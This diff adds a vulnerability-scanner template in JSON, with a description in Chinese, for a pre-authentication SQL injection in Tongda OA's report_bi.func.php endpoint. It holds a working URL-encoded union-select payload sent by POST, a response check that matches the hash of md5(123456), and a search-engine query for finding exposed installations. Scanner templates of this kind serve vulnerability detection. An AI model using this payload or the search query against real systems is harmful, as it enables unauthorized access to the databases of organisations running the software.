@@ -1,0 +1,36 @@
+{
+  "product": "通达OA",
+  "vul_name": "通达OA report_bi 前台SQL注入",
+  "type": "SQL注入",
+  "vul_id": [],
+  "level": 3,
+  "vul_desc": "通达OA（Office Anywhere网络智能办公系统）是由北京通达信科科技有限公司自主研发的协同办公自动化软件，是与中国企业管理实践相结合形成的综合管理办公平台。通达OA为各行业不同规模的众多用户提供信息化管理能力，包括流程审批、行政办公、日常事务、数据统计分析、即时通讯、移动办公等，帮助广大用户降低沟通和管理成本，提升生产和决策效率。通达OA report_bi.func.php 存在SQL注入漏洞,攻击者通过漏洞可以获取数据库信息",
+  "version": "通达OA2017-通达OA V11.6",
+  "note": "",
+  "search": {
+    "Hunter": "app.name=\"通达 OA\""
+  },
+  "protocol": "http",
+  "link": "https://blog.csdn.net/qq_33331244/article/details/136154631",
+  "fix": [
+    "建议联系软件厂商进行处理。"
+  ],
+  "exploit": {
+    "exp": {
+      "method": "post",
+      "follow": false,
+      "path": "/general/bi_design/appcenter/report_bi.func.php",
+      "data": "_POST[dataset_id]=efgh%27-%40%60%27%60%29union%20select%20md5%28123456%29%2C2%2Cmd5%28123456%29%23%27%26action%3Dget_link_info&"
+    },
+    "verify": {
+      "path": "",
+      "logic": "and",
+      "check": [
+        {
+          "status": 200,
+          "body": "e10adc3949ba59abbe56e057f20f883e"
+        }
+      ]
+    }
+  }
+}
